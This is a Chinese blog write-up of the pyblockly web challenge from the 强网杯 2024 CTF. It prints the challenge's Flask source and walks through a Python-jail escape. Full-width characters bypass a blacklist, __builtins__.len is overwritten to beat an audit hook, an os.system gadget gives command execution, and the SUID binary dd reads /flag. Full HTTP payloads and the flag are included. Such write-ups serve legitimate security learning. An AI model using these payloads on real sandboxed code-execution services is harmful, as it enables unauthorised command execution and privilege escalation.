---
title: "强网杯 2024 web pyblockly 单题wp"
date: 2024-11-08 18:37
updated: 2024-11-08 18:37
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
description: "这次跟的wgpsec打。不给复现写不了wp，第一次打国内的比赛有点疏忽了。把pyblockly写详细点儿吧（pyblockly留了做题记录） 贴一下wgpsec的wp：https://mp.weixin.qq.com/s/NzZ-ZJlyCh2sk3vbNbswiw WEB几乎AK了，tql师傅们 "
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18529990"
---
这次跟的wgpsec打。不给复现写不了wp，第一次打国内的比赛有点疏忽了。把pyblockly写详细点儿吧（pyblockly留了做题记录）

贴一下wgpsec的wp：[https://mp.weixin.qq.com/s/NzZ-ZJlyCh2sk3vbNbswiw](https://mp.weixin.qq.com/s/NzZ-ZJlyCh2sk3vbNbswiw)

WEB几乎AK了，tql师傅们

像这种PYjail接触的比较少，题目质量也很高，记录一下

下载附件，读

app.py

```
from flask import Flask, request, jsonify
import re
import unidecode
import string
import ast
import sys
import os
import subprocess
import importlib.util
import json

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False

blacklist_pattern = r"[!\"#$%&'()*+,-./:;<=>?@[\\\]^_`{|}~]"

def module_exists(module_name):

    spec = importlib.util.find_spec(module_name)
    if spec is None:
        return False

    if module_name in sys.builtin_module_names:
        return True
    
    if spec.origin:
        std_lib_path = os.path.dirname(os.__file__)
        
        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):
            return True
    return False

def verify_secure(m):
    for node in ast.walk(m):
        match type(node):
            case ast.Import:  
                print("ERROR: Banned module ")
                return False
            case ast.ImportFrom: 
                print(f"ERROR: Banned module {node.module}")
                return False
    return True

def check_for_blacklisted_symbols(input_text):
    if re.search(blacklist_pattern, input_text):
        return True
    else:
        return False

def block_to_python(block):
    block_type = block['type']
    code = ''
    
    if block_type == 'print':
        text_block = block['inputs']['TEXT']['block']
        text = block_to_python(text_block)  
        code = f"print({text})"
           
    elif block_type == 'math_number':
        
        if str(block['fields']['NUM']).isdigit():      
            code =  int(block['fields']['NUM']) 
        else:
            code = ''
    elif block_type == 'text':
        if check_for_blacklisted_symbols(block['fields']['TEXT']):
            code = ''
        else:
        
            code =  "'" + unidecode.unidecode(block['fields']['TEXT']) + "'"
    elif block_type == 'max':
        
        a_block = block['inputs']['A']['block']
        b_block = block['inputs']['B']['block']
        a = block_to_python(a_block)  
        b = block_to_python(b_block)
        code =  f"max({a}, {b})"

    elif block_type == 'min':
        a_block = block['inputs']['A']['block']
        b_block = block['inputs']['B']['block']
        a = block_to_python(a_block)
        b = block_to_python(b_block)
        code =  f"min({a}, {b})"

    if 'next' in block:
        
        block = block['next']['block']
        
        code +="\n" + block_to_python(block)+ "\n"
    else:
        return code 
    return code

def json_to_python(blockly_data):
    block = blockly_data['blocks']['blocks'][0]

    python_code = ""
    python_code += block_to_python(block) + "\n"

        
    return python_code

def do(source_code):
    hook_code = '''
def my_audit_hook(event_name, arg):
    blacklist = ["popen", "input", "eval", "exec", "compile", "memoryview"]
    if len(event_name) > 4:
        raise RuntimeError("Too Long!")
    for bad in blacklist:
        if bad in event_name:
            raise RuntimeError("No!")

__import__('sys').addaudithook(my_audit_hook)

'''
    print(source_code)
    code = hook_code + source_code
    tree = compile(source_code, "run.py", 'exec', flags=ast.PyCF_ONLY_AST)
    try:
        if verify_secure(tree):  
            with open("run.py", 'w') as f:
                f.write(code)        
            result = subprocess.run(['python', 'run.py'], stdout=subprocess.PIPE, timeout=5).stdout.decode("utf-8")
            os.remove('run.py')
            return result
        else:
            return "Execution aborted due to security concerns."
    except:
        os.remove('run.py')
        return "Timeout!"

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/blockly_json', methods=['POST'])
def blockly_json():
    blockly_data = request.get_data()
    print(type(blockly_data))
    blockly_data = json.loads(blockly_data.decode('utf-8'))
    print(blockly_data)
    try:
        python_code = json_to_python(blockly_data)
        return do(python_code)
    except Exception as e:
        return jsonify({"error": "Error generating Python code", "details": str(e)})
    
if __name__ == '__main__':
    app.run(host = '0.0.0.0')
```

web1是很复杂的题目呢。然而其实大部分代码都没啥用，我们的思路也很明显————通过block传递恶意代码执行。

出题人煞费苦心给题目套了一个很复杂的包装。其实对我们的攻击没多大影响。这里使用json\_to\_python来提取输入中的blocks，再在block\_to\_python中对每一个blocks进行分类（如print，max，min）再写入一个python文件中执行。

首先在block\_to\_python中随便一个功能（比如说print吧），最后都是直接使用字符串拼接的方式将输入拼到代码里。这里很容易想到用`')`闭合print('')并在后面用`;`或`\n`加入代码的RCE手段（要注释掉后面的`')`）。进一步可以看到print模式要获取一个TEXT，可以直接将输入经过一次unidecode.unidecode后拼入print中执行。而TEXT要经过一个检测，这里因为是先进行检测后unidecode.unidecode。所以可以用全角字符进行绕过（全角字符在unidecode.unidecode后变为半角字符）

搓出payload如下

```
{
  "blocks": {
    "blocks": [
      {
        "type": "print",
        "id": "print1",
        "inputs": {
          "TEXT": {
            "block": {
              "type": "text",
              "id": "text1",
              "fields": {
                "TEXT": "ｓ＂＇）\nｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂， ＂ｒ＂）．ｒｅａｄ（））\n＃"
              }
            }
          }
        }
      }
    ]
  }
}
```

可得到文件回显

这里只能读取文件，没有读取/flag的权限。考虑到RCE+提权的方式。可以看到在将用户的输入拼入py文件时添加了一个hook函数中，对event\_name长度进行了限制。并且加入限制event\_name了一个黑名单。

```
def my_audit_hook(event_name, arg):
    # print(f"[+]{event_name},{arg}")
    blacklist = ["popen", "input", "eval", "exec", "compile", "memoryview"]
    if len(event_name) > 4:
        raise RuntimeError("Too Long!")
    for bad in blacklist:
        if bad in event_name:
            raise RuntimeError("No!")
```

对event\_name不熟悉的师傅可以看看https://peps.python.org/pep-0578/

看到所有的event\_name里，只有open和exec满足长度小于等于4，而exec又在黑名单里。

于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3。

```
__builtins__.len = lambda x: 3
```

随后我们搓个POC：

```
POST /blockly_json HTTP/1.1
Host: eci-2ze1c97lhjoulskvhtrj.cloudeci1.ichunqiu.com:5000
Content-Length: 473
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/json
Origin: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000
Referer: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  "blocks": {
    "blocks": [
      {
        "type": "print",
        "id": "print1",
        "inputs": {
          "TEXT": {
            "block": {
              "type": "text",
              "id": "text1",
 "fields": {
                "TEXT": "ｓ＂＇）\n＿＿ｂｕｉｌｔｉｎｓ＿＿．ｌｅｎ　＝　ｌａｍｂｄａ　ｘ：　３\nｐｒｉｎｔ（ｌｅｎ（＂ａｓｄｂｂ＂））\n＃"
              }
            }
          }
        }
      }
    ]
  }
}
```

可以看到返回3

![](/images/migrated/18529990/01.png)

WIN！摆脱了长度的限制之后，就只剩下一个可有可无的黑名单了

限制了exec，我们就用os.system。照抄SSTIpayload即可

```
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
```

可以执行任意命令。接下来看SUID文件。发现DD可以越权读取

![](/images/migrated/18529990/02.png)

DD读取，转全角字符，拿flag

```
POST /blockly_json HTTP/1.1
Host: eci-2ze1c97lhjoulskvhtrj.cloudeci1.ichunqiu.com:5000
Content-Length: 473
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/json
Origin: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000
Referer: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  "blocks": {
    "blocks": [
      {
        "type": "print",
        "id": "print1",
        "inputs": {
          "TEXT": {
            "block": {
              "type": "text",
              "id": "text1",
 "fields": {
                "TEXT": "ｓ＂＇）\n＿＿ｂｕｉｌｔｉｎｓ＿＿．ｌｅｎ　＝　ｌａｍｂｄａ　ｘ：　３\n［　ｘ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿　ｆｏｒ　ｘ　ｉｎ　＇＇．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅ＿＿．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）　ｉｆ　ｘ．＿＿ｎａｍｅ＿＿＝＝＂＿ｗｒａｐ＿ｃｌｏｓｅ＂］［０］［＂ｓｙｓｔｅｍ＂］（＂ｄｄ　ｉｆ＝／ｆｌａｇ＂）\n＃"
              }
            }
          }
        }
      }
    ]
  }
}
```

**flag{7cla4fe8981e295a78508a49146340b9}**
